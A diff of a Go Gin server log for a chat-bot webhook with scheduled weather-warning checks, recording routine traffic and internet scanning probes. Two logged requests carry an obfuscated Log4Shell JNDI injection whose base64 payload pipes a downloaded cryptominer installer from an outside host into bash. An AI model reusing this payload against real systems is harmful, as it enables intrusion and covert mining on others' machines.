@@ -6,413 +6,294 @@ nohup: ignoring input
  - using code:	gin.SetMode(gin.ReleaseMode)
 
 [GIN-debug] GET    /ping                     --> main.main.func1 (3 handlers)
-[GIN-debug] POST   /webhook/event            --> main.main.NewEventHandlerFunc.func3 (3 handlers)
-2024/08/05 05:49:14 http server started: http://localhost:9000/webhook/event
+[GIN-debug] POST   /webhook/event            --> main.main.NewEventHandlerFunc.func5 (3 handlers)
+2024/08/11 15:53:19 http server started: http://localhost:9000/webhook/event
 
 [GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
 Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
 [GIN-debug] Listening and serving HTTP on :9000
-2024/08/05 05:49:26 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/05 05:49:26 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/05 - 05:49:26 | 200 |  697.123099ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/05 05:49:37 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/05 - 05:49:37 | 200 |  1.227878814s |   123.58.10.238 | POST     "/webhook/event"
-[GIN] 2024/08/05 - 05:56:11 | 404 |       1.052µs |  180.101.244.12 | GET      "/"
-[GIN] 2024/08/05 - 05:56:11 | 404 |         441ns | 220.196.160.151 | GET      "/webhook/event"
-[GIN] 2024/08/05 - 05:56:11 | 404 |         691ns | 180.101.245.248 | GET      "/"
-[GIN] 2024/08/05 - 06:10:40 | 404 |       1.052µs |   62.234.23.129 | GET      "/"
-Weather warning check executed at: 2024-08-05 06:30:00
-time="2024-08-05T06:30:00+08:00" level=info msg="暂无天气预警"
-Task executed at: 2024-08-05 06:55:00
-2024/08/05 06:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-Weather warning check executed at: 2024-08-05 07:30:00
-time="2024-08-05T07:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 08:30:00
-time="2024-08-05T08:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 09:08:46 | 404 |         792ns |   198.235.24.73 | GET      "/"
-[GIN] 2024/08/05 - 09:14:49 | 404 |         941ns | 220.196.160.146 | GET      "/"
-Weather warning check executed at: 2024-08-05 09:30:00
-time="2024-08-05T09:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 10:30:00
-time="2024-08-05T10:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/05 11:06:03 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/05 11:06:03 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/05 - 11:06:04 | 200 |  1.046901772s |   123.58.10.239 | POST     "/webhook/event"
-2024/08/05 11:07:30 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:07:30 | 200 |  620.132406ms | 220.243.131.172 | POST     "/webhook/event"
-2024/08/05 11:07:36 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/05 - 11:07:37 | 200 |  701.361564ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/05 11:07:48 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/05 - 11:07:49 | 200 |  682.862824ms | 220.243.131.172 | POST     "/webhook/event"
-2024/08/05 11:12:33 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:12:33 | 200 |  785.179859ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/05 11:12:38 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:12:39 | 200 |  489.495543ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/05 11:12:44 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:12:45 | 200 |  554.456459ms |   123.58.10.239 | POST     "/webhook/event"
-2024/08/05 11:12:55 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:12:56 | 200 |   497.44499ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/05 11:12:59 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:13:00 | 200 |  581.235589ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/05 11:13:10 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:13:10 | 200 |  670.637394ms |   123.58.10.239 | POST     "/webhook/event"
-2024/08/05 11:13:24 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:13:24 | 200 |  506.877866ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/05 11:13:34 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:13:34 | 200 |  483.204184ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/05 11:13:44 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 11:13:45 | 200 |  491.688019ms |   123.58.10.238 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-05 11:30:00
-time="2024-08-05T11:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 12:30:00
-time="2024-08-05T12:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 13:30:00
-time="2024-08-05T13:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 14:06:04 | 404 |         962ns |   167.94.146.50 | GET      "/"
-[GIN] 2024/08/05 - 14:06:14 | 404 |         702ns |   167.94.146.50 | GET      "/"
-[GIN] 2024/08/05 - 14:06:15 | 404 |         561ns |   167.94.146.50 | PRI      "*"
-Weather warning check executed at: 2024-08-05 14:30:00
-time="2024-08-05T14:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 14:38:18 | 404 |         781ns | 154.212.141.154 | GET      "/"
-[GIN] 2024/08/05 - 14:38:18 | 404 |         652ns |   101.36.123.30 | GET      "/"
-[GIN] 2024/08/05 - 14:38:18 | 404 |         661ns |   101.36.123.30 | GET      "/favicon.ico"
-2024/08/05 15:08:37 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/05 15:08:37 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 15:08:38 | 200 |  750.868451ms | 220.243.131.173 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-05 15:30:00
-time="2024-08-05T15:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 15:35:59 | 404 |         601ns |    185.91.127.9 | GET      "/t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//54.37.131.59:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wudG9wL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=}')"
-[GIN] 2024/08/05 - 16:06:04 | 404 |         671ns | 220.196.160.144 | GET      "/webhook/event"
-Weather warning check executed at: 2024-08-05 16:30:00
-time="2024-08-05T16:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 17:30:00
-time="2024-08-05T17:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 17:45:52 | 404 |         942ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/05 - 17:45:52 | 404 |         270ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/05 - 17:45:52 | 404 |         291ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/05 - 17:45:52 | 404 |         290ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/05 - 18:01:15 | 404 |         561ns |  220.196.160.65 | GET      "/"
-Weather warning check executed at: 2024-08-05 18:30:00
-time="2024-08-05T18:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 18:45:09 | 404 |         641ns |  52.228.155.176 | GET      "/"
-2024/08/05 19:18:22 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/05 19:18:22 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/05 - 19:18:23 | 200 |  766.037619ms | 220.243.131.173 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-05 19:30:00
-time="2024-08-05T19:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/05 - 19:41:17 | 404 |         673ns |    106.75.17.42 | GET      "/"
-Weather warning check executed at: 2024-08-05 20:30:00
-time="2024-08-05T20:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 21:30:00
-time="2024-08-05T21:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 22:30:00
-time="2024-08-05T22:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-05 23:30:00
-time="2024-08-05T23:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 00:30:00
-time="2024-08-06T00:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 01:30:00
-time="2024-08-06T01:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 02:30:00
-time="2024-08-06T02:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 03:30:00
-time="2024-08-06T03:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 03:35:44 | 404 |         611ns | 162.142.125.206 | GET      "/"
-[GIN] 2024/08/06 - 03:35:53 | 404 |         751ns | 162.142.125.206 | GET      "/"
-[GIN] 2024/08/06 - 03:35:54 | 404 |         581ns | 162.142.125.206 | PRI      "*"
-[GIN] 2024/08/06 - 03:43:40 | 404 |         912ns | 180.101.245.247 | GET      "/"
-Weather warning check executed at: 2024-08-06 04:30:00
-time="2024-08-06T04:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 04:39:15 | 404 |         712ns |  198.235.24.154 | GET      "/"
-[GIN] 2024/08/06 - 05:16:07 | 404 |         521ns |  220.196.160.51 | GET      "/"
-[GIN] 2024/08/06 - 05:16:07 | 404 |         651ns |   59.83.208.106 | GET      "/"
-Weather warning check executed at: 2024-08-06 05:30:00
-time="2024-08-06T05:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 06:30:00
-time="2024-08-06T06:30:00+08:00" level=info msg="暂无天气预警"
-Task executed at: 2024-08-06 06:55:00
-2024/08/06 06:55:00 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/06 06:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/06 - 06:56:03 | 404 |         892ns |  90.151.171.108 | CONNECT  ""
-[GIN] 2024/08/06 - 06:56:13 | 404 |         872ns |  90.151.171.108 | GET      "/ip?Z70955480370Q1"
-Weather warning check executed at: 2024-08-06 07:30:00
-time="2024-08-06T07:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 08:18:14 | 404 |         481ns |   174.138.61.44 | GET      "/"
-Weather warning check executed at: 2024-08-06 08:30:00
-time="2024-08-06T08:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 09:28:55 | 404 |         751ns |    66.108.67.41 | GET      "/"
-Weather warning check executed at: 2024-08-06 09:30:00
-time="2024-08-06T09:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/06 09:56:27 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/06 09:56:27 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/06 - 09:56:27 | 200 |   809.37768ms | 220.243.131.172 | POST     "/webhook/event"
-[GIN] 2024/08/06 - 10:23:36 | 404 |         581ns |  180.101.244.13 | GET      "/"
-Weather warning check executed at: 2024-08-06 10:30:00
-time="2024-08-06T10:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 11:30:00
-time="2024-08-06T11:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 12:30:00
-time="2024-08-06T12:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 13:30:00
-time="2024-08-06T13:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 13:49:58 | 404 |         721ns |  220.196.160.95 | GET      "/webhook/event"
-Weather warning check executed at: 2024-08-06 14:30:00
-time="2024-08-06T14:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 15:30:00
-time="2024-08-06T15:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 16:30:00
-time="2024-08-06T16:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 17:30:00
-time="2024-08-06T17:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 18:30:00
-time="2024-08-06T18:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 18:31:26 | 404 |         561ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/06 - 18:31:26 | 404 |         231ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/06 - 18:31:26 | 404 |         251ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/06 - 18:31:26 | 404 |         281ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/06 - 18:38:13 | 404 |       1.052µs |   193.118.52.30 | GET      "/"
-[GIN] 2024/08/06 - 18:38:27 | 404 |         771ns |   193.118.52.30 | GET      "/favicon-32x32.png"
-[GIN] 2024/08/06 - 18:38:28 | 404 |         801ns |   193.118.52.30 | GET      "/api/session/properties"
-Weather warning check executed at: 2024-08-06 19:30:00
-time="2024-08-06T19:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 20:30:00
-time="2024-08-06T20:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/06 - 20:37:30 | 404 |         651ns |   59.83.208.108 | GET      "/"
-Weather warning check executed at: 2024-08-06 21:30:00
-time="2024-08-06T21:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 22:30:00
-time="2024-08-06T22:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-06 23:30:00
-time="2024-08-06T23:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 00:30:00
-time="2024-08-07T00:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 01:30:00
-time="2024-08-07T01:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 02:30:00
-time="2024-08-07T02:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/07 - 02:35:54 | 404 |         791ns |    13.91.50.116 | GET      "/"
-Weather warning check executed at: 2024-08-07 03:30:00
-time="2024-08-07T03:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 04:30:00
-time="2024-08-07T04:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 05:30:00
-time="2024-08-07T05:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/07 - 06:08:16 | 404 |         561ns |   59.83.208.107 | GET      "/"
-[GIN] 2024/08/07 - 06:08:16 | 404 |         641ns | 180.101.245.247 | GET      "/"
-[GIN] 2024/08/07 - 06:22:18 | 404 |         571ns |  180.101.244.16 | GET      "/"
-Weather warning check executed at: 2024-08-07 06:30:00
-time="2024-08-07T06:30:00+08:00" level=info msg="暂无天气预警"
-Task executed at: 2024-08-07 06:55:00
-2024/08/07 06:55:00 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/07 06:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/07 - 07:01:40 | 404 |         781ns |    185.91.127.9 | GET      "/t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//54.37.131.59:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wudG9wL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=}')"
-Weather warning check executed at: 2024-08-07 07:30:00
-time="2024-08-07T07:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 08:30:00
-time="2024-08-07T08:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 09:30:00
-time="2024-08-07T09:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 10:30:00
-time="2024-08-07T10:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/07 - 10:38:45 | 404 |         872ns |  198.235.24.173 | GET      "/"
-Weather warning check executed at: 2024-08-07 11:30:00
-time="2024-08-07T11:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 12:30:00
-time="2024-08-07T12:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 13:30:00
-time="2024-08-07T13:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/07 - 14:02:43 | 404 |         562ns |  220.196.160.45 | GET      "/"
-Weather warning check executed at: 2024-08-07 14:30:00
-time="2024-08-07T14:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 15:30:00
-time="2024-08-07T15:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/07 16:14:41 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/07 16:14:41 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/07 - 16:14:42 | 200 |  883.338283ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/07 16:18:55 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/07 - 16:18:56 | 200 |  679.633485ms |   123.58.10.239 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-07 16:30:00
-time="2024-08-07T16:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/07 16:41:42 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/07 - 16:41:42 | 200 |  621.426586ms |   123.58.10.238 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-07 17:30:00
-time="2024-08-07T17:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 18:30:00
-time="2024-08-07T18:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 19:30:00
-time="2024-08-07T19:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 20:30:00
-time="2024-08-07T20:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 21:30:00
-time="2024-08-07T21:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 22:30:00
-time="2024-08-07T22:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-07 23:30:00
-time="2024-08-07T23:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/07 23:49:07 [Error] [handle event,path:/webhook/event, error:interface conversion: interface {} is nil, not string]
-[GIN] 2024/08/07 - 23:49:07 | 500 |    5.632685ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/07 23:49:23 [Error] [handle event,path:/webhook/event, error:interface conversion: interface {} is nil, not string]
-[GIN] 2024/08/07 - 23:49:23 | 500 |    3.635748ms |   123.58.10.239 | POST     "/webhook/event"
-2024/08/07 23:54:25 [Error] [handle event,path:/webhook/event, error:interface conversion: interface {} is nil, not string]
-[GIN] 2024/08/07 - 23:54:25 | 500 |    3.472118ms | 220.243.131.172 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-08 00:30:00
-time="2024-08-08T00:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/08 00:54:25 [Error] [handle event,path:/webhook/event, error:interface conversion: interface {} is nil, not string]
-[GIN] 2024/08/08 - 00:54:25 | 500 |    3.364907ms | 220.243.131.172 | POST     "/webhook/event"
-[GIN] 2024/08/08 - 01:27:32 | 404 |       1.002µs |  220.196.160.53 | GET      "/webhook/event"
-Weather warning check executed at: 2024-08-08 01:30:00
-time="2024-08-08T01:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 02:30:00
-time="2024-08-08T02:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 03:30:00
-time="2024-08-08T03:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 04:30:00
-time="2024-08-08T04:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 05:30:00
-time="2024-08-08T05:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/08 - 05:50:04 | 404 |         702ns |  220.196.160.61 | GET      "/"
-[GIN] 2024/08/08 - 05:50:04 | 404 |         691ns | 129.211.166.142 | GET      "/webhook/event"
-[GIN] 2024/08/08 - 05:50:04 | 404 |         741ns | 220.196.160.144 | GET      "/"
-Weather warning check executed at: 2024-08-08 06:30:00
-time="2024-08-08T06:30:00+08:00" level=info msg="暂无天气预警"
-2024/08/08 06:54:25 [Error] [handle event,path:/webhook/event, error:interface conversion: interface {} is nil, not string]
-[GIN] 2024/08/08 - 06:54:25 | 500 |    4.555835ms |   123.58.10.239 | POST     "/webhook/event"
-Task executed at: 2024-08-08 06:55:00
-2024/08/08 06:55:00 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/08 06:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-Weather warning check executed at: 2024-08-08 07:30:00
-time="2024-08-08T07:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 08:30:00
-time="2024-08-08T08:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 09:30:00
-time="2024-08-08T09:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/08 - 10:10:22 | 404 |         661ns |   4.255.100.246 | GET      "/"
-Weather warning check executed at: 2024-08-08 10:30:00
-time="2024-08-08T10:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 11:30:00
-time="2024-08-08T11:30:00+08:00" level=info msg="暂无天气预警"
-Weather warning check executed at: 2024-08-08 12:30:00
-time="2024-08-08T12:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/08 - 12:42:30 | 404 |         571ns |   103.203.57.26 | GET      "/echo.php?info=20240808044230"
-Weather warning check executed at: 2024-08-08 13:30:00
-time="2024-08-08T13:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/08 - 13:57:52 | 404 |         571ns |  205.210.31.205 | GET      "/"
-Weather warning check executed at: 2024-08-08 14:30:00
-time="2024-08-08T14:30:00+08:00" level=info msg="暂无天气预警"
-[GIN] 2024/08/08 - 14:48:02 | 404 |         811ns |  185.142.236.36 | GET      "/"
-[GIN] 2024/08/08 - 14:48:04 | 404 |         881ns |  185.142.236.36 | GET      "/favicon.ico"
-Weather warning check executed at: 2024-08-08 15:30:00
-2024/08/08 15:30:00 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/08 15:30:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-2024/08/08 15:30:25 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/08 - 15:30:26 | 200 |  554.957882ms | 220.243.131.172 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-08 16:30:00
-[GIN] 2024/08/08 - 17:07:05 | 404 |         581ns |  206.168.34.209 | GET      "/"
-[GIN] 2024/08/08 - 17:07:05 | 404 |         671ns |  206.168.34.209 | PRI      "*"
-Weather warning check executed at: 2024-08-08 17:30:00
-Weather warning check executed at: 2024-08-08 18:30:00
-2024/08/08 18:37:31 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/08 18:37:31 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/08 - 18:37:32 | 200 |  787.418622ms | 220.243.131.172 | POST     "/webhook/event"
-[GIN] 2024/08/08 - 18:48:56 | 404 |         551ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/08 - 18:48:56 | 404 |         551ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/08 - 18:48:56 | 404 |         251ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/08 - 18:48:56 | 404 |         541ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/08 - 18:56:38 | 404 |         721ns |   59.83.208.107 | GET      "/"
-[GIN] 2024/08/08 - 19:26:51 | 404 |         731ns | 220.196.160.101 | GET      "/webhook/event"
-Weather warning check executed at: 2024-08-08 19:30:00
-[GIN] 2024/08/08 - 19:53:37 | 404 |         631ns |   167.94.146.48 | GET      "/"
-[GIN] 2024/08/08 - 19:53:47 | 404 |         711ns |   167.94.146.48 | GET      "/"
-[GIN] 2024/08/08 - 19:53:47 | 404 |         541ns |   167.94.146.48 | PRI      "*"
-Weather warning check executed at: 2024-08-08 20:30:00
-[GIN] 2024/08/08 - 20:47:42 | 404 |         951ns |  146.70.129.163 | GET      "/VVLd"
-[GIN] 2024/08/08 - 20:47:42 | 404 |         781ns |  146.70.129.163 | GET      "/cc3d"
-[GIN] 2024/08/08 - 20:47:43 | 404 |         881ns |  146.70.129.163 | GET      "/jquery-3.3.1.slim.min.js"
-[GIN] 2024/08/08 - 20:47:43 | 404 |         561ns |  146.70.129.163 | GET      "/jquery-3.3.1.min.js"
-Weather warning check executed at: 2024-08-08 21:30:00
-[GIN] 2024/08/08 - 22:26:00 | 404 |         761ns |  167.99.118.165 | GET      "/"
-Weather warning check executed at: 2024-08-08 22:30:00
-Weather warning check executed at: 2024-08-08 23:30:00
-Weather warning check executed at: 2024-08-09 00:30:00
-2024/08/09 00:40:51 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/09 00:40:51 [Debug] [req:POST,/open-apis/im/v1/messages]
-[GIN] 2024/08/09 - 00:40:52 | 200 |  746.878097ms | 220.243.131.173 | POST     "/webhook/event"
-[GIN] 2024/08/09 - 00:54:36 | 404 |         611ns |  220.196.160.75 | GET      "/webhook/event"
-[GIN] 2024/08/09 - 01:29:32 | 404 |         862ns |   59.83.208.104 | GET      "/"
-[GIN] 2024/08/09 - 01:29:33 | 404 |         742ns | 180.101.245.250 | GET      "/"
-Weather warning check executed at: 2024-08-09 01:30:00
-Weather warning check executed at: 2024-08-09 02:30:00
-Weather warning check executed at: 2024-08-09 03:30:00
-Weather warning check executed at: 2024-08-09 04:30:00
-[GIN] 2024/08/09 - 04:59:18 | 404 |         551ns |  220.196.160.83 | GET      "/cc3d"
-[GIN] 2024/08/09 - 05:20:12 | 404 |         551ns |  167.94.145.106 | GET      "/"
-[GIN] 2024/08/09 - 05:20:21 | 404 |         611ns |  167.94.145.106 | GET      "/"
-[GIN] 2024/08/09 - 05:20:22 | 404 |         571ns |  167.94.145.106 | PRI      "*"
-[GIN] 2024/08/09 - 05:23:33 | 404 |         511ns |   59.83.208.105 | GET      "/"
-Weather warning check executed at: 2024-08-09 05:30:00
-Weather warning check executed at: 2024-08-09 06:30:00
-2024/08/09 06:52:27 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/09 06:52:27 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 06:52:27 | 200 |  623.539915ms |   123.58.10.239 | POST     "/webhook/event"
-[GIN] 2024/08/09 - 06:53:15 | 404 |         622ns |  220.196.160.96 | GET      "/webhook/event"
-Task executed at: 2024-08-09 06:55:00
-2024/08/09 06:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
-Weather warning check executed at: 2024-08-09 07:30:00
-Weather warning check executed at: 2024-08-09 08:30:00
-Weather warning check executed at: 2024-08-09 09:30:00
-Weather warning check executed at: 2024-08-09 10:30:00
-2024/08/09 11:08:49 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/09 11:08:49 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 11:08:50 | 200 |  848.164372ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/09 11:16:43 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 11:16:44 | 200 |  696.017021ms |   123.58.10.238 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-09 11:30:00
